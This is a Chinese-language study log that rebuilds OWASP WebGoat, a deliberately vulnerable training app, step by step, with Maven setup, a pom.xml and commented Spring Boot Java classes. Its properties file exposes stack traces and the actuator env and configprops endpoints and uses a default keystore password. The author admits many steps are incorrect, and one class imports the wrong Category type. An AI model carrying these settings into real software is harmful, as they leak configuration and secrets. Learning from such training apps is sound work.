# 简介

这个仓库是对webgoat全部代码的完整审计,其中有不少是不正确的操作,可以选择性查看

# 安装webgoat

下载源码

```
https://github.com/WebGoat/WebGoat.git
```

下载mvn

![image-20220524163535138](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524163535138.png)

环境变量

![image-20220524163613082](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524163613082.png)

```
mvn -v
```

![image-20220524163638372](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524163638372.png)

idea打开

![image-20220524192934466](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524192934466.png)

jdk设置为17

![image-20220524192952447](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524192952447.png)

改一下构建工具

![image-20220524193029108](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524193029108.png)

下载依赖

![image-20220524193046703](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524193046703.png)

我也是莫名其妙下完的,刚学这个不太懂

找到这个目录点这个箭头,如果下载完成了的话构建就会正常的

![image-20220524193157199](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524193157199.png)

![image-20220524193241713](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524193241713.png)

![image-20220524193247826](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524193247826.png)

这样做主要是因为spring boot没学过,不会配置

# MyWebGoat

![image-20220702155125505](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702155125505.png)

这里先了解了一些pom.xml的语法规则

![image-20220702132857005](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702132857005.png)

https://blog.csdn.net/qq_41570658/article/details/120646393

![image-20220702145820274](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702145820274.png)

propertiesw文件

```properties
server.error.include-stacktrace=always
#显示异常堆栈信息
server.error.path=/error.html
#writelabel的默认路径是error.可以通过设置server.error.path参数自定义错误页面

server.servlet.context-path=/WebGoat
#设置应用的上下文路径,项目的路径作为url地址的一部分
server.servlet.session.persistent=false
#server.servlet.session.persistent默认值为false，但会持久化，需要在配置文件中重新配置为false，才会不持久化。

server.port=${webgoat.port:8080}
#服务器端口 这里就相当于如果webgoat.port有配置就使用webgoat.prot 如果没有配置就使用8080
server.address=${webgoat.host}
#服务器ip

webgoat.host=${WEBGOAT_HOST:127.0.0.1}
#服务器ip
spring.application.name=WebGoat
#是用来代表服务名的

server.ssl.key-store-type=${WEBGOAT_KEYSTORE_TYPE:PKCS12}
#ssl证书的类型PKCS12
server.ssl.key-store=${WEBGOAT_KEYSTORE:classpath:goatkeystore.pkcs12}
#ssl证书的路径
server.ssl.key-store-password=${WEBGOAT_KEYSTORE_PASSWORD:password}
#ssl保存证书密钥库的密码
server.ssl.key-alias=${WEBGOAT_KEY_ALIAS:goat}
#ssl标识密钥库中密钥的别名
server.ssl.enabled=${WEBGOAT_SSLENABLED:false}
#是否启用ssl支持

spring.datasource.url=jdbc:hsqldb:file:${webgoat.server.directory}/webgoat
#连接数据库的路径
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.HSQLDialect
#使用的jpa语言是什么
spring.datasource.driver-class-name=org.hsqldb.jdbc.JDBCDriver
#使用的驱动名称
spring.jpa.properties.hibernate.default_schema=CONTAINER
spring.banner.location=classpath:banner.txt
#这个是启动时的文字图片

logging.level.org.thymeleaf=INFO
#thymeleaf 支持 trace、debug、info级别的日志信息
logging.level.org.thymeleaf.TemplateEngine.CONFIG=INFO
#初始化期间输出详细配置信息
logging.level.org.thymeleaf.TemplateEngine.TIMER=INFO
#输出模板引擎执行时间
logging.level.org.thymeleaf.TemplateEngine.cache.TEMPLATE_CACHE=INFO
#输出模板表达式缓存信息
logging.level.org.springframework.web=INFO
#org.springframework.web包下的日志以info级别输出
logging.level.org.springframework=INFO
logging.level.org.springframework.boot.devtools=INFO
logging.level.org.owasp=DEBUG
logging.level.org.owasp.webgoat=DEBUG

webgoat.server.directory=${user.home}/.webgoat-${webgoat.build.version}/
#webgoat.server.directory的目录
webgoat.user.directory=${user.home}/.webgoat-${webgoat.build.version}/
#webgoat.user.directory的目录
webgoat.build.version=@project.version@
#这里也就是从pom.xml中取出版本
webgoat.email=webgoat@owasp.org
webgoat.emaillist=owasp-webgoat@lists.owasp.org
webgoat.feedback.address=webgoat@owasp.org
webgoat.feedback.address.html=<A HREF=mailto:webgoat@owasp.org>webgoat@owasp.org</A>
webgoat.database.connection.string=jdbc:hsqldb:mem:{USER}
webgoat.default.language=en

webwolf.host=${WEBWOLF_HOST:127.0.0.1}
#webwolf的ip
webwolf.port=${WEBWOLF_PORT:9090}
#webwolf的端口
webwolf.url=http://${webwolf.host}:${webwolf.port}
#webwolf的url
webwolf.landingpage.url=${webwolf.url}/landing

webwolf.mail.url=${webwolf.url}/mail

spring.jackson.serialization.indent_output=true
#忽略无法转换的对象
spring.jackson.serialization.write-dates-as-timestamps=false
#将date转换为时间戳
#For static file refresh ... and faster dev :D
spring.devtools.restart.additional-paths=webgoat-container/src/main/resources/static/js,webgoat-container/src/main/resources/static/css
#添加的路径
exclude.categories=${EXCLUDE_CATEGORIES:none,none}
#exclude based on the enum of the Category

exclude.lessons=${EXCLUDE_LESSONS:none,none}
#exclude based on the class name of a lesson e.g.: LessonTemplate

management.health.db.enabled=true
#启用开发者配置内容的健康指标
management.endpoint.health.show-details=always
#health端点公开的信息可以配置 详细信息显示给所有用户
management.endpoints.web.exposure.include=env, health,configprops
#暴露需要监控的接口
```

# Server

![image-20220702153801895](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702153801895.png)

![image-20220702153838830](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702153838830.png)

会发现添加了一个依赖项目

![image-20220702153910207](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702153910207.png)

源码下载

```
mvn dependency:resolve -Dclassifier=sources
```

![image-20220702160618821](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702160618821.png)

## server.StartWebGoat

从这里开始并不是直接写完这个一个startwebGoat文件的,而是从这里遇到新的就去写.

```java
package com.wanan.webgoat.server;


import com.wanan.webgoat.container.WebGoat;
import lombok.extern.slf4j.Slf4j;
import org.springframework.boot.Banner;
import org.springframework.boot.WebApplicationType;
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.util.SocketUtils;

import static java.util.Optional.of;
import static java.util.Optional.ofNullable;

@Slf4j
public class StartWebGoat {
    public static final String WEBGOAT_PORT = "webgoat.port";
    //    定义webgoat的字符
    private static final int MAX_PORT = 9999;
    //    定义最大端口

    public static void main(String[] args) {
        setEnvironmentVariableForPort(WEBGOAT_PORT,"8080");
        new SpringApplicationBuilder().parent(ParentConfig.class)//使用Parentconfig配置类
                .web(WebApplicationType.NONE).bannerMode(Banner.Mode.OFF)//不启动内嵌的WebServer，不是运行web application   banner也就是启动的那个图
                .child(WebGoat.class)//定义子配置项
                .web(WebApplicationType.SERVLET)//启动内嵌的reactive web server，这个application是一个reactive web application
                .run(args);
    }

    /**
     * 用于设置环境端口
     * @param name 自定义端口号
     * @param defaultValue 默认端口号
     */
    private static void setEnvironmentVariableForPort(String name,String defaultValue){
        ofNullable(System.getProperty(name))//       如果 value 非 null ，则创建一个包含了指定 T 类型的 value 值的 Optional 实例，否则创建一个空的 Optional 实例

                .or(()->of(defaultValue)) //or 就是如果指定了端口就返回指定端口 如果没有指定端口就用默认端口
                .map(Integer::parseInt) //如果给定端口就进行类型转换
                .map(port -> findPort(port)) //同样如果给定端口就去寻找是否有可用端口
                .ifPresent(port -> System.setProperty(name,port));//如果找到了就将端口定下来
    }
    public static String findPort(int port){
        try {
            if(port == MAX_PORT){
//            如果端口到达最大端口就打印日志并返回端口信息
                log.error("No free port found from 8080 - {}",MAX_PORT);
                return ""+ port;
            }
            return "" + SocketUtils.findAvailableTcpPort(port,port);
//        从端口范围中随机选择一个可用端口
        } catch (IllegalStateException var4){
            return findPort(port +1);
//                    如果没有端口不可用就端口加一再次寻找端口
        }


    }

}

```

# container

## WebGoat

![image-20220702200431223](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702200431223.png)

![image-20220702200359178](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702200359178.png)

```java
package com.wanan.webgoat.container;

import com.wanan.webgoat.container.session.UserSessionData;
import com.wanan.webgoat.container.session.WebSession;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.context.annotation.*;
import org.springframework.web.client.RestTemplate;

import java.io.File;

@Configuration
@ComponentScan(basePackages = {"com.wanan.webgoat.container","com.wanan.webgoat.lessons"})
//根据定义的扫描路径，把符合扫描规则的类装配到spring容器中
@PropertySource("classpath:application-webgoat.properties")
//properties类型配置文件
@EnableAutoConfiguration
//@EnableAutoConfiguration注释，此注释自动载入应用程序所需的所有Bean
public class WebGoat {
    @Bean(name = "pluginTargetDirectory")
    public File pluginTargetDirectory(@Value("${webgoat.user.directory}") final String webgoatHome) {
        return new File(webgoatHome);
    }
//    取出用户配置中的路径信息
    @Bean
    @Scope(value = "session",proxyMode = ScopedProxyMode.TARGET_CLASS)
    public WebSession webSession(){return new WebSession();}
//    根据session类创建返回一个session对象

    @Bean
    @Scope(value = "session",proxyMode = ScopedProxyMode.TARGET_CLASS)
    public UserSessionData userSessionData(){
        return new UserSessionData("test","data");
    }

    @Bean
    public RestTemplate restTemplate(){return new RestTemplate();}

}

```

## users

### WebGoatUser

![image-20220702170759289](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702170759289.png)

![image-20220702170920741](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702170920741.png)

![image-20220702171034696](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702171034696.png)

```java
package com.wanan.webgoat.container.users;

import lombok.Getter;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.core.userdetails.UserDetails;

import javax.persistence.Entity;
import javax.persistence.Id;
import javax.persistence.Transient;
import java.util.Collection;
import java.util.Collections;
import java.util.Objects;

@Getter
@Entity
// @Entity是指这个类映射到数据库表
public class WebGoatUser implements UserDetails {
    public static final String ROLE_USER = "WEBGOAT_USER";
    public static final String ROLE_ADMIN  = "WEBGOAT_ADMIN";

    @Id
//    用于声明一个实体类的属性映射为数据库的主键列。该属性通常置于属性声明语句之前，可与声明语句同行，也可写在单独行上。
    private String username;
    private String password;
    private String role = ROLE_USER;

    @Transient
//    java 的transient关键字的作用是需要实现Serilizable接口，将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会序列化到指定的目的地中。
    private User user;



    protected WebGoatUser() {
    }
    public WebGoatUser(String username,String password){
        this(username,password,ROLE_USER);
    }
    public WebGoatUser(String username,String password,String role){
        this.username = username;
        this.password = password;
        this.role = role;
        createUser();
    }

    public void createUser() {
        this.user = new User(username,password,getAuthorities());
    }



    public String getUsername() {
        return username;
    }

    public String getPassword() {
        return password;
    }

    public String getRole() {
        return role;
    }

    @Override
    public boolean equals(Object o) {
         return o instanceof WebGoatUser webGoatUser && this.user.equals(webGoatUser.user);
    }

    @Override
    public int hashCode() {
        return user.hashCode();
    }

    @Override
    public Collection<? extends GrantedAuthority> getAuthorities() {
        return Collections.singleton(new SimpleGrantedAuthority(getRole()));

    }

    @Override
    public boolean isAccountNonExpired() {
        return this.user.isAccountNonExpired();
    }

    @Override
    public boolean isAccountNonLocked() {
        return this.user.isAccountNonLocked();
    }

    @Override
    public boolean isCredentialsNonExpired() {
        return this.user.isCredentialsNonExpired();
    }

    @Override
    public boolean isEnabled() {
        return this.user.isEnabled();
    }
}

```



## lessons

### Assignment

```java
package com.wanan.webgoat.container.lessons;

import lombok.EqualsAndHashCode;
import lombok.Getter;

import javax.persistence.*;
import java.util.List;

@Getter
@EqualsAndHashCode
@Entity
public class Assignment {
    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
//    场景：公司开发使用Mysql数据库，生产使用Oracle数据库，当同时使用两种数据库时，JPA主键生成策略可以选择GenerationType.Auto来实现。
    private long id;
    private String name;
    private String path;

    @Transient
    private List<String > hints;

    public Assignment() {
    }
    public Assignment(String name,String path,List<String> hints){
        if (path.equals("") || path.equals("/") || path.equals("/WebGoat/")){
            throw new IllegalStateException("The path of assignment '" + name + "' overrides WebGoat endpoints, please choose a path within the scope of the lesson");
        }
        this.name = name;
        this.path = path;
        this.hints = hints;
    }

}
```

### Lesson

```java
package com.wanan.webgoat.container.lessons;






import jdk.jfr.Category;

import java.util.List;

public abstract class Lesson {
    private static int count = 1;
    private Integer id = null;
    private List<Assignment> assignments;

    public Lesson() {
        id =++count;
    }
    public String getName(){
        String className = getClass().getName();
        return className.substring(className.lastIndexOf('.') + 1);
    }
//    返回本类名
    public Category getCategory(){
        return getDefaultCategory();
    }

    protected abstract Category getDefaultCategory();

    public abstract String getTitle();

    protected String getPath(){
        return "#lesson/";
    }
    public String getLink(){
        return String.format("%s%s.lesson",getPath(),getId());
    }
    public final String getId(){return this.getClass().getSimpleName();}
    public String toString(){return getTitle();}
    public final String getPackage(){
        var packageName  = this.getClass().getPackageName();
        return packageName.replaceAll("com.wanan.webgoat.lessons","").replaceAll("\\..*","");
    }


}
```

### Category

```java
package com.wanan.webgoat.container.lessons;

import lombok.Getter;

public enum Category {
    INTRODUCTION("Introduction",5),
    GENERAL("General",100),


    A1("(A1) Broken Access Control", 301),
    A2("(A2) Cryptographic Failures", 302),
    A3("(A3) Injection", 303),

    A5("(A5) Security Misconfiguration", 305),
    A6("(A6) Vuln & Outdated Components", 306),
    A7("(A7) Identity & Auth Failure", 307),
    A8("(A8) Software & Data Integrity", 308),
    A9("(A9) Security Logging Failures", 309),
    A10("(A10) Server-side Request Forgery", 310),

    CLIENT_SIDE("Client side", 1700),

    CHALLENGE("Challenges", 3000);

    @Getter
    private String name;
    @Getter
    private Integer ranking;
    Category(String name,Integer ranking){
        this.name= name;
        this.ranking = ranking;
    }

    @Override
    public String toString(){return getName();}

}
```

### WebSession

![image-20220702170315844](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702170315844.png)

![image-20220702170401824](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702170401824.png)

```java
package com.wanan.webgoat.container.session;

import com.wanan.webgoat.container.lessons.Lesson;
import com.wanan.webgoat.container.users.WebGoatUser;
import org.springframework.security.core.context.SecurityContextHolder;

import java.io.Serial;
import java.io.Serializable;

public class WebSession implements Serializable {

    private static final long serialVersionUID = 8965787678158574766L;
//    可序列化
    private final WebGoatUser currentUser;
    private transient Lesson currentLesson;
    private boolean securityEnabled;


    public WebSession() {
        this.currentUser = (WebGoatUser) SecurityContextHolder.getContext().getAuthentication().getPrincipal();
    }
//    获取当前用户
    public void setCurrentLesson(Lesson lesson){
        this.currentLesson = lesson;
    }


    public Lesson getCurrentLesson() {
        return this.currentLesson;
    }
    public String getUserName(){
        return currentUser.getUsername();
    }
    public WebGoatUser getUser(){
        return currentUser;
    }
    public void toggleSecurity(){
        this.securityEnabled = !this.securityEnabled;
    }
    public boolean isSecurityEnable(){
        return securityEnabled;
    }



}

```



## session

### UserSessionData

```java
package com.wanan.webgoat.container.session;

import java.util.HashMap;

public class UserSessionData {
    private HashMap<String ,Object> userSessionData = new HashMap<>();

    public UserSessionData() {
    }
    public UserSessionData(String key,String value){
        setValue(key,value);
    }
    public Object getValue(String key){
        if (!userSessionData.containsKey(key)){
            return null;
        }
        return userSessionData.get(key);
    }
    public void setValue(String key,Object value){
        if (userSessionData.containsKey(key)){
            userSessionData.replace(key,value);
        }else {
            userSessionData.put(key,value);
        }
    }

}
```

# webwolf

![image-20220705180756835](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220705180756835.png)

## WebWolf

```java
package com.wanan.webgoat.webwolf;

import com.wanan.webgoat.webwolf.requests.WebWolfTraceRepository;
import org.springframework.boot.actuate.trace.http.HttpTraceRepository;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.PropertySource;

@Configuration
//用于定义配置类
@ComponentScan("com.wanan.webgoat.webwolf")
//告诉Spring 哪个packages 的用注解标识的类 会被spring自动扫描并且装入bean容器,param即用来指定扫描包的范围。
@PropertySource("classpath:application-webwolf.properties")
//properties类型配置文件
@EnableAutoConfiguration
//@EnableAutoConfiguration就是借助@Import来收集所有符合自动配置条件的bean定义，并加载到IOC容器中
public class WebWolf {
    @Bean
    public HttpTraceRepository traceRepository(){return new WebWolfTraceRepository();}
}
```

## requests

### WebWolfTraceRepository

```java
package com.wanan.webgoat.webwolf.requests;

import com.google.common.collect.EvictingQueue;
import lombok.extern.slf4j.Slf4j;
import org.springframework.boot.actuate.trace.http.HttpTrace;
import org.springframework.boot.actuate.trace.http.HttpTraceRepository;

import java.util.ArrayList;
import java.util.List;

@Slf4j
public class WebWolfTraceRepository implements HttpTraceRepository {
    private final EvictingQueue<HttpTrace> traces = EvictingQueue.create(10000);
//    最近N次执行http请求，执行时间超过阈值T的次数大于等于M，则认为当前网络慢 用于缓存
    private final List<String> exclusionList = List.of("/tmpdir","/home","/files","/images/",
        "/favicon.ico","/js/","/webjars","/requests","/css/","/mail");


    @Override
    public List<HttpTrace> findAll(){
        return List.of();
    }
    public List<HttpTrace> findAllTraces(){
        return new ArrayList<>(traces);
    }
    private boolean isInExclusionList(String path){
        return exclusionList.stream().anyMatch(e->path.contains(e));
    }
    @Override
    public void add(HttpTrace httpTrace){
        var path = httpTrace.getRequest().getUri().getPath();
//        获取uri路径
        if(!isInExclusionList(path)){
            traces.add(httpTrace);
        }

    }

}
```

# 修复异常启动

这里直接启动肯定会出现非常多的异常,大概就是pom.xml中缺少依赖项目,springboot版本不同.properties配置未添加,

application-webgoat.properties

```properties
webgoat.user.directory=${user.home}/.webgoat-${webgoat.build.version}/

spring.datasource.url=jdbc:hsqldb:file:${webgoat.server.directory}/webgoat
spring.datasource.driver-class-name=org.hsqldb.jdbc.JDBCDriver


webgoat.build.version=@project.version@
```

```
JWTController
```

application-webwolf.properties

```properties
server.port=${webwolf.port:9090}
spring.application.name=WebWolf
```

pom.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.example</groupId>
    <artifactId>MyWebGoat</artifactId>
    <version>8.2.3-SNAPSHOT</version>
    <name>MyWebGoat</name>
    <description>MyWebGoat</description>

    <parent>

        <groupId>org.springframework.boot</groupId>
        <!--        被继承的父项目的构件表示符-->
        <artifactId>spring-boot-starter-parent</artifactId>
        <!--        被继承的父项目全球唯一标识符-->
        <version>2.6.6</version>
        <!--        被继承的父项目的版本-->
    </parent>

    <properties>
        <java.version>17</java.version>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <project.reporting.outputEncoding>UTF-8</project.reporting.outputEncoding>
        <spring-boot.version>2.6.6</spring-boot.version>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
            <exclusions>
                <exclusion>
                    <groupId>org.junit.vintage</groupId>
                    <artifactId>junit-vintage-engine</artifactId>
                </exclusion>
            </exclusions>
        </dependency>


        <dependency>
            <groupId>org.projectlombok</groupId>
            <artifactId>lombok</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-data-jpa</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-core</artifactId>
            <version>5.6.2</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-web</artifactId>
            <version>5.3.20</version>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-undertow</artifactId>
        </dependency>
        <!--跟tomcat一样，也是一个web服务器。-->


        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
            <exclusions>
                <exclusion>
                    <groupId>org.springframework.boot</groupId>
                    <artifactId>spring-boot-starter-tomcat</artifactId>
                </exclusion>
            </exclusions>
        </dependency>
        <dependency>
            <groupId>org.hsqldb</groupId>
            <artifactId>hsqldb</artifactId>
        </dependency>


        <!--        自动化管理Webdriver驱动文件-->

    </dependencies>

    <dependencyManagement>
        <dependencies>
            <dependency>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-dependencies</artifactId>
                <version>${spring-boot.version}</version>
                <type>pom</type>
                <scope>import</scope>
            </dependency>
        </dependencies>
    </dependencyManagement>

    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <version>3.8.0</version>
                <configuration>
                    <source>16</source>
                    <target>16</target>
                    <encoding>UTF-8</encoding>
                </configuration>
            </plugin>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
                <version>2.3.7.RELEASE</version>
                <configuration>
                    <mainClass>com.wanan.webgoat.server.StartWebGoat</mainClass>
                </configuration>
                <executions>
                    <execution>
                        <id>repackage</id>
                        <goals>
                            <goal>repackage</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>

</project>
```

![image-20220702210331524](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702210331524.png)

# container

## MvcConfiguration

这里我们初始时没有添加thymeleaf模板引擎,所以访问会爆500错误,因此我们需要添加上去

![image-20220703162250649](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220703162250649.png)

![image-20220703161328196](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220703161328196.png)

![image-20220703162353426](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220703162353426.png)

![image-20220704171709746](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220704171709746.png)

```java
package com.wanan.webgoat.container;

import com.wanan.webgoat.container.i18n.Language;
import com.wanan.webgoat.container.i18n.Messages;
import com.wanan.webgoat.container.i18n.PluginMessages;
import com.wanan.webgoat.container.lessons.LessonScanner;
import com.wanan.webgoat.container.session.LabelDebugger;
import lombok.RequiredArgsConstructor;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.ResourceLoader;
import org.springframework.core.io.support.ResourcePatternResolver;
import org.springframework.stereotype.Controller;
import org.springframework.web.servlet.LocaleResolver;
import org.springframework.web.servlet.ViewResolver;
import org.springframework.web.servlet.config.annotation.ResourceHandlerRegistration;
import org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;
import org.springframework.web.servlet.config.annotation.ViewControllerRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;
import org.springframework.web.servlet.i18n.SessionLocaleResolver;
import org.thymeleaf.IEngineConfiguration;
import org.thymeleaf.extras.springsecurity5.dialect.SpringSecurityDialect;
import org.thymeleaf.spring5.SpringTemplateEngine;
import org.thymeleaf.spring5.templateresolver.SpringResourceTemplateResolver;
import org.thymeleaf.spring5.view.ThymeleafViewResolver;
import org.thymeleaf.templatemode.TemplateMode;
import org.thymeleaf.templateresolver.FileTemplateResolver;
import org.thymeleaf.templateresolver.ITemplateResolver;
import org.thymeleaf.templateresolver.StringTemplateResolver;
import org.thymeleaf.templateresource.ITemplateResource;
import org.thymeleaf.templateresource.StringTemplateResource;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Map;
import java.util.Set;


@Configuration
//注解类
@RequiredArgsConstructor
//写在类上可以代替@Autowired注解，需要注意的是在注入时需要用final定义，或者使用@notnull注解
//@Autowired 注释添加到需要该类型数组的字段或方法，则 Spring 会从ApplicationContext 中搜寻符合指定类型的所有 bean
public class MvcConfiguration implements WebMvcConfigurer {
    private static final String UTF8 = "UTF-8";
//    定义字符集
    private final LessonScanner lessonScanner;

    @Override
    public void addViewControllers(ViewControllerRegistry registry) {
        registry.addViewController("/login").setViewName("login");
        registry.addViewController("/lesson_content").setViewName("lesson_content");
        registry.addViewController("/start.mvc").setViewName("main_new");
        registry.addViewController("/scoreboard").setViewName("scoreboard");
    }

    @Bean
    public ViewResolver viewResolver(SpringTemplateEngine thymeleafTemplateEngine){
        ThymeleafViewResolver resolver = new ThymeleafViewResolver();
        resolver.setTemplateEngine(thymeleafTemplateEngine);
//        设置模板引擎是thymeleafTemplateEngine
        resolver.setCharacterEncoding(StandardCharsets.UTF_8.displayName());
//        设置字符集utf-8
        return resolver;
    }
    @Bean
    public ITemplateResolver lessonThymeleafTemplateResolver(ResourceLoader resourceLoader){
//        大概就是获取一个模板解析器
        var resolver = new FileTemplateResolver(){
            @Override
            protected ITemplateResource computeTemplateResource(IEngineConfiguration configuration, String ownerTemplate, String template, String resourceName, String characterEncoding, Map<String ,Object> templateResolutionAttributes){
                try(var is = resourceLoader.getResource("classpath:"+resourceName).getInputStream()) {
                    return new StringTemplateResource(new String(is.readAllBytes(),StandardCharsets.UTF_8));
                } catch (IOException e) {
                    return null;
                }
            }
        };
        resolver.setOrder(1);
        //        设置解析器的执行顺序为1
        return resolver;
    }

    @Bean
    public ITemplateResolver springThymeleafTemplateResolver(ApplicationContext applicationContext){
        SpringResourceTemplateResolver resolver = new SpringResourceTemplateResolver();
        resolver.setPrefix("classpath:/webgoat/templates/");
//        设置模板文件的前缀
        resolver.setSuffix(".html");
//        设置模本文件的后缀
        resolver.setTemplateMode(TemplateMode.HTML);
//        设置模本模型为html
        resolver.setOrder(2);
//        设置解析器的执行顺序为2
        resolver.setCharacterEncoding(UTF8);
//        设置字符集
        resolver.setApplicationContext(applicationContext);
        return resolver;
    }
    @Bean
    public LessonTemplateResolver LessonTemplateResolver(ResourceLoader resourceLoader){
        LessonTemplateResolver lessonTemplateResolver = new LessonTemplateResolver(resourceLoader);
        lessonTemplateResolver.setOrder(0);
        lessonTemplateResolver.setCacheable(false);
//        不启用缓存模式
        lessonTemplateResolver.setCharacterEncoding(UTF8);
        return lessonTemplateResolver;

    }

    @Bean
    public AsciiDoctorTemplateResolver asciiDoctorTemplateResolver(ResourceLoader resourceLoader){
        AsciiDoctorTemplateResolver resolver = new AsciiDoctorTemplateResolver(resourceLoader);
        resolver.setCacheable(false);
        resolver.setOrder(1);
        resolver.setCharacterEncoding(UTF8);
        return resolver;

    }
    @Bean
    public SpringTemplateEngine thymeleafTemplateEngine(ITemplateResolver springThymeleafTemplateResolver,
                                                        LessonTemplateResolver lessonTemplateResolver,
                                                        AsciiDoctorTemplateResolver asciiDoctorTemplateResolver,
                                                        ITemplateResolver lessonThymeleafTemplateResolver){
        SpringTemplateEngine engine = new SpringTemplateEngine();
        engine.setEnableSpringELCompiler(true);
        engine.addDialect(new SpringSecurityDialect());
        engine.setTemplateResolvers(Set.of(lessonTemplateResolver, asciiDoctorTemplateResolver, lessonThymeleafTemplateResolver, springThymeleafTemplateResolver));
        return engine;
    }
    @Override
    public void addResourceHandlers(ResourceHandlerRegistry registry){
        registry.addResourceHandler("/css/**").addResourceLocations("classpath:/webgoat/static/css/");
        registry.addResourceHandler("/js/**").addResourceLocations("classpath:/webgoat/static/js/");
        registry.addResourceHandler("/plugins/**").addResourceLocations("classpath:/webgoat/static/plugins/");
        registry.addResourceHandler("/fonts/**").addResourceLocations("classpath:/webgoat/static/fonts/");
//        注册静态资源

        registry.addResourceHandler("/images/**").addResourceLocations(lessonScanner.applyPattern("classpath:/lessons/%s/images/").toArray(String[]::new));
        registry.addResourceHandler("/lesson_js/**").addResourceLocations(lessonScanner.applyPattern("classpath:/lessons/%s/js/").toArray(String[]::new));
        registry.addResourceHandler("/lesson_css/**").addResourceLocations(lessonScanner.applyPattern("classpath:/lessons/%s/css/").toArray(String[]::new));
        registry.addResourceHandler("/lesson_templates/**").addResourceLocations(lessonScanner.applyPattern("classpath:/lessons/%s/templates").toArray(String[]::new));
        registry.addResourceHandler("/video/**").addResourceLocations(lessonScanner.applyPattern("classpath:/lessons/%s/video").toArray(String[]::new));
//        注册lessons的静态资源

    }
    @Bean
    public PluginMessages pluginMessages(Messages messages, Language language,
                                         ResourcePatternResolver resourcePatternResolver){
        PluginMessages pluginMessages = new PluginMessages(messages,language,resourcePatternResolver);
        pluginMessages.setDefaultEncoding("UTF-8");
        pluginMessages.setBasename("i18n/WebGoatLables");
        pluginMessages.setFallbackToSystemLocale(false);
        return pluginMessages;        
    }

    @Bean
    public Language language(LocaleResolver localeResolver){return new Language(localeResolver);}
//    配置语言
    @Bean
    public Messages messageSource(Language language){
        Messages messages = new Messages(language);
        messages.setDefaultEncoding("UTF-8");
        messages.setBasename("classpath:i18n/messages");
        messages.setFallbackToSystemLocale(false);
        return messages;
    }
    @Bean
    public LocaleResolver localeResolver(){
        return new SessionLocaleResolver();
    }

    @Bean
    public LabelDebugger labelDebugger(){return new LabelDebugger();}
}

```

## lessons

### LessonScanner

```java
package com.wanan.webgoat.container.lessons;

import lombok.Getter;
